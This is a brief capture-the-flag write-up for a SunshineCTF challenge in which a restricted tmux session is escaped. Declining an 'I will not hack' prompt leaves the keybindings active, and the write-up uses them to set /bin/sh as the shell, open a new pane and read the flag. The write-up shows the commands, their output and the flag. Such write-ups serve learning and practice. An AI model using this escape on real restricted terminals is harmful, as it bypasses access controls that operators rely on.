# Space Is My Banner

```
I did it again.

This time I'm sure I accessed a satellite.

I'm scared, it's giving me a warning message when I log in.

I think this time I may have gone too far... this seems to be some top security stuff...
socat file:`tty`,raw,echo=0 TCP:chal.sunshinectf.games:25002 
```

Connect to the server, we have an access to tmux. If we accept the `I will not hack` button, the tmux bindings will be unset. However, if we don't accept, we are in a tmux where keybindings are working (you can see that from the banner below, `Hacker Blocker` means we are free, `Protected from Hackers` means we are locked), so we can just:

```shell
# C-b stands for Control-B, the default tmux prefix
C-b : set default-shell /bin/sh
C-b : split-window
# in the newly created shell window
$ ls -al
total 80
dr-xr-xr-x    1 root     root          4096 Sep 27 14:22 .
drwxr-xr-x    1 root     root          4096 Sep 27 16:31 ..
-r-xr-sr-x    1 root     flag-read     18512 Sep 27 14:22 cat-flag
-r-xr-xr-x    1 root     root          5213 Sep 23 20:52 challenge.sh
-r-xr-x---    1 root     root         18592 Sep 27 14:22 drop-perms
-r-xr-xr-x    1 root     root           367 Sep 23 20:52 fake-term.sh
-r--r-----    1 root     flag-read        82 Sep 23 20:52 flag.txt
-r--r--r--    1 root     root          5619 Sep 23 20:52 system_logs.txt
$ ./cat-flag
sun{wait-wait-wait-you-cannot-hack-me-you-agreed-to-not-do-that-that-is-not-fair}
```

Flag: `sun{wait-wait-wait-you-cannot-hack-me-you-agreed-to-not-do-that-that-is-not-fair}`.
